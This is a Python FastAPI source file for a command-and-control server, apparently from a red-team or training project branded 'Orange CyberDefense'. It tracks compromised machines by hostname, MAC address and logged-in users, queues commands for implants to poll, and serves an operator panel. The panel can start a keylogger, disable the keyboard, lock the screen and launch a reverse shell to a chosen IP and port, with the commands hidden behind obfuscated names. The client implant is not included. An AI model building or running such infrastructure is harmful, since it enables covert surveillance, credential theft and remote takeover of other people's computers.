from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, Form
from fastapi.responses import HTMLResponse
from sqlalchemy import Column, Integer, String, DateTime, Boolean, create_engine
from sqlalchemy.orm import declarative_base, sessionmaker
from datetime import datetime
from typing import List, Dict, Optional
import json

app = FastAPI()
clients: List[WebSocket] = []
connected_macs: Dict[str, WebSocket] = {}

# === DB setup ===
Base = declarative_base()
engine = create_engine("sqlite:///data.db")
SessionLocal = sessionmaker(bind=engine)

class Report(Base):
    __tablename__ = "report"
    id = Column(Integer, primary_key=True)
    hostname = Column(String)
    mac_address = Column(String)
    users = Column(String)
    timestamp = Column(DateTime, default=datetime.utcnow)

class Command(Base):
    __tablename__ = "command"
    id = Column(Integer, primary_key=True)
    mac_address = Column(String)
    command = Column(String)
    executed = Column(Boolean, default=False)

Base.metadata.create_all(bind=engine)

# === Broadcast update ===
async def broadcast_update():
    message = json.dumps({"event": "refresh"})
    for ws in clients:
        try:
            await ws.send_text(message)
        except:
            pass

@app.get("/machines/json")
async def machines_json():
    db = SessionLocal()
    machines = db.query(Report).order_by(Report.timestamp.desc()).all()
    db.close()
    result = []
    for m in machines:
        result.append({
            "hostname": m.hostname,
            "mac_address": m.mac_address,
            "timestamp": m.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
            "online": m.mac_address.strip() in connected_macs
        })
    return result

@app.post("/report")
async def report(request: Request):
    data = await request.json()
    hostname = data.get("hostname", "unknown")
    mac_address = data.get("mac_address", "unknown").strip()
    users = json.dumps(data.get("users", []), ensure_ascii=False)

    db = SessionLocal()
    existing = db.query(Report).filter_by(mac_address=mac_address).first()

    if existing:
        existing.hostname = hostname
        existing.users = users
        existing.timestamp = datetime.utcnow()
        print(f"[~] Mise à jour : {hostname} ({mac_address})")
    else:
        new_entry = Report(hostname=hostname, mac_address=mac_address, users=users)
        db.add(new_entry)
        print(f"[+] Nouvelle machine reçue : {hostname} ({mac_address})")
    db.commit()
    db.close()
    await broadcast_update()
    return {"status": "ok"}

@app.get("/commands/{mac}")
async def get_command(mac: str):
    db = SessionLocal()
    cmd = db.query(Command).filter_by(mac_address=mac, executed=False).first()
    if cmd:
        cmd.executed = True
        db.commit()
        db.close()
        return {"command": cmd.command}
    db.close()
    return {"command": None}

@app.get("/control", response_class=HTMLResponse)
async def control_form():
    db = SessionLocal()
    machines = db.query(Report).order_by(Report.timestamp.desc()).all()
    db.close()

    html = """
    <html>
    <head>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: #ffffff; margin: 0; padding: 0; }
            header { background-color: #ff7900; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; }
            .container { display: flex; padding: 20px; }
            .form-section, .list-section { flex: 1; padding: 20px; background-color: #1e1e1e; margin: 10px; border-radius: 10px; box-shadow: 0 0 10px rgba(255, 121, 0, 0.3); }
            label { font-weight: bold; display: block; margin-top: 15px; color: #ff7900; }
            input, select { width: 100%; padding: 10px; margin-top: 5px; border: none; border-radius: 5px; background-color: #2e2e2e; color: white; }
            button { margin-top: 20px; padding: 10px 20px; background-color: #ff7900; border: none; border-radius: 5px; color: black; font-weight: bold; cursor: pointer; }
            ul { list-style: none; padding-left: 0; }
            li { margin-bottom: 10px; padding: 10px; background-color: #2a2a2a; border-left: 5px solid; border-radius: 5px; }
            .online { border-color: #00ff00; }
            .offline { border-color: #ff0000; }
            .timestamp { font-size: 12px; color: #bbbbbb; }
        </style>
    </head>
    <body>
        <header>🛡️ Contrôle des Machines - Orange CyberDefense</header>
        <div class="container">
            <div class="form-section">
                <form method="post">
                    <label for="mac">Machine cible (MAC)</label>
                    <select name="mac_address" id="mac">
    """

    for m in machines:
        html += f'<option value="{m.mac_address}">{m.hostname} - {m.mac_address}</option>'

    html += """
                    </select>
                    <label for="command">Commande</label>
                    <select name="command" id="command" onchange="toggleFields()">
                        <option value="SHOW_POPUP">📢 Afficher une alerte</option>
                        <option value="OPEN_NOTEPAD">📝 Ouvrir le Bloc-notes</option>
                        <option value="PATATE_ON">🎹 Lancer le Keylogger</option>
                        <option value="LOCK_SCREEN">🔒 Verrouiller l’écran</option>
                        <option value="FFO_ETATAP">🛑 Désactiver le clavier</option>
                        <option value="OQUETTE">✅ Réactiver le clavier</option>
                        <option value="CIA_GW">🧹 Supprimer l'implant</option>
                        <option value="POMMEAPARLER">📡 Lancer le reverse shell</option>
                    </select>
                    <div id="reverse-shell-fields" style="display: none;">
                        <label for="ip_address">Adresse IP</label>
                        <input type="text" id="ip_address" name="ip_address"
                               placeholder="192.168.1.100"
                               pattern="^\\d{1,3}(\\.\\d{1,3}){3}$"
                               title="Entrez une adresse IP valide (ex: 192.168.1.100)">
                        <label for="port">Port</label>
                        <input type="number" id="port" name="port" placeholder="4444">
                    </div>
                    <button type="submit">Envoyer</button>
                </form>
            </div>
            <div class="list-section">
                <h3>Machines Connues</h3>
                <ul id="machine-list"></ul>
            </div>
        </div>
        <script>
            function toggleFields() {
                const cmd = document.getElementById("command").value;
                document.getElementById("reverse-shell-fields").style.display = cmd === "POMMEAPARLER" ? "block" : "none";
            }

            async function updateMachineList() {
                try {
                    const res = await fetch("/machines/json");
                    const data = await res.json();
                    const list = document.getElementById("machine-list");
                    list.innerHTML = "";
                    data.forEach(m => {
                        const li = document.createElement("li");
                        li.className = m.online ? "online" : "offline";
                        li.innerHTML = `<strong>${m.hostname}</strong> - ${m.mac_address}<br><span class='timestamp'>${m.timestamp}</span>`;
                        list.appendChild(li);
                    });
                } catch (e) {
                    console.error("Erreur actualisation machines", e);
                }
            }

            setInterval(updateMachineList, 5000);
            updateMachineList();
            const socket = new WebSocket(`ws://${location.host}/ws`);
            socket.onmessage = (event) => {
                const data = JSON.parse(event.data);
                if (data.event === "refresh") {
                    updateMachineList();
                }
            };
        </script>
    </body>
    </html>
    """
    return html

@app.post("/control")
async def control(
        mac_address: str = Form(...),
        command: str = Form(...),
        ip_address: Optional[str] = Form(None),
        port: Optional[str] = Form(None)
):
    full_command = command
    if command == "POMMEAPARLER" and ip_address and port:
        full_command = f"{command}|{ip_address}|{port}"

    print(f"[+] Commande envoyée : {full_command}")

    db = SessionLocal()
    db.add(Command(mac_address=mac_address, command=full_command))
    db.commit()
    db.close()

    for ws in clients:
        await ws.send_text(json.dumps({"mac": mac_address, "command": full_command}))

    return HTMLResponse('<meta http-equiv="refresh" content="0; url=/control">')

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    clients.append(websocket)
    mac_address = None
    print("[+] Client WebSocket connecté")

    try:
        while True:
            data = await websocket.receive_text()
            try:
                parsed = json.loads(data)
                if parsed.get("event") == "register":
                    mac_address = parsed.get("data").split(" - ")[-1].strip()
                    connected_macs[mac_address] = websocket
                    print(f"[+] Machine enregistrée : {mac_address}")
                    await broadcast_update()
            except Exception as e:
                print("[!] Erreur parsing WebSocket JSON :", e)
    except WebSocketDisconnect:
        print("[-] Client WebSocket déconnecté")
        clients.remove(websocket)
        if mac_address and mac_address in connected_macs:
            del connected_macs[mac_address]
        await broadcast_update()

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("server:app", host="0.0.0.0", port=5000, reload=False)
